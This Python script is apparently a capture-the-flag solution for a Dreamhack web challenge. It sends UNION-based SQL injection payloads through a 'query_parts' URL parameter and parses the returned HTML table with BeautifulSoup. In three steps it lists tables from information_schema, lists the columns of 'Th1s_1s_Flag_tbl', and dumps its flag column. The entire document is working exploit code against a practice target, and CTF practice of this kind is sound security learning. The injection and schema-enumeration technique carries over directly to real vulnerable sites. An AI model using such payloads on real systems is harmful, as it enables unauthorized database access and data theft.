import requests
from bs4 import BeautifulSoup
TARGET_URL = 'http://host1.dreamhack.games:20848'

def display(data):
    for ele in data:
        print(ele)

def inject(sql):
    query = f"search_cols=navy&keyword=&operator=or&query_parts=1 union select 1,1,1,{sql} --+"

    res = requests.get(f"{TARGET_URL}/?{query}")
    soup = BeautifulSoup(res.text, 'html.parser')

    table = soup.find('table')
    table_body = table.find('tbody')
    rows = table_body.find_all('tr')

    data = []
    for row in rows:
        cols = row.find_all('td')
        cols = [col.text for col in cols]
        data.append([ele for ele in cols if ele])

    return data

display(inject('table_name FROM information_schema.tables WHERE table_schema != \'mysql\' AND table_schema != \'information_schema\''))
display(inject('column_name FROM information_schema.columns WHERE table_name = \'Th1s_1s_Flag_tbl\''))
display(inject('f1ag FROM Th1s_1s_Flag_tbl'))